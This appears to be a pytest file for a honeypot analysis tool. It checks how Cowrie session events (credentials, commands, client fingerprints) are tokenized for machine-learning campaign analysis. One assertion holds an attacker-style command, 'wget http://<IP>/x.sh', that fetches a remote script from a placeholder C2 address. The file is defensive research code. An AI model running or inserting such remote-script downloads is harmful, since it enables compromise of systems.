import polars as pl
import pytest

from honeypot.analysis.ml.tests.fixtures import campaign_events
from honeypot.analysis.ml.tokens import (
    client_tokens,
    command_tokens,
    credential_tokens,
)


@pytest.fixture(scope="module")
def events() -> pl.DataFrame:
    return campaign_events(ips_per_campaign=5)[0]


def test_tokens_are_per_session(events) -> None:
    sessions = set(events["session"].unique().to_list())
    for tokens in (
        credential_tokens(events),
        command_tokens(events),
        client_tokens(events),
    ):
        assert set(tokens.columns) >= {"src_ip", "session"}
        assert set(tokens["session"].unique().to_list()) <= sessions


def test_credential_tokens_pair_and_user_per_attempt(events) -> None:
    tokens = credential_tokens(events)
    attempts = events.filter(
        pl.col("eventid").is_in(["cowrie.login.success", "cowrie.login.failed"])
    ).height
    assert tokens.height == 2 * attempts
    assert tokens["token"].str.starts_with("pair=").sum() == attempts


def test_command_tokens_normalized_in_order(events) -> None:
    commands = command_tokens(events)
    assert commands.select("src_ip", "session").is_duplicated().sum() == 0
    flat = commands["commands"].explode(empty_as_null=True).drop_nulls().to_list()
    # C2 addresses replaced by fingerprinting's normalization.
    assert "wget http://<IP>/x.sh" in flat
    assert not any(c[0].isdigit() and c.count(".") == 3 for c in flat)


def test_command_tokens_see_only_the_events_given(events) -> None:
    first = (
        events.filter(pl.col("eventid") == "cowrie.command.input")
        .sort("event_timestamp")
        .group_by("session", maintain_order=True)
        .head(1)
    )
    cut = command_tokens(first)
    assert cut["commands"].list.len().max() == 1


def test_client_tokens_prefixed(events) -> None:
    tokens = client_tokens(events)["token"]
    assert tokens.null_count() == 0
    assert tokens.str.contains(r"^(version|hassh|telnet)=").all()
    assert tokens.str.starts_with("telnet=").any()
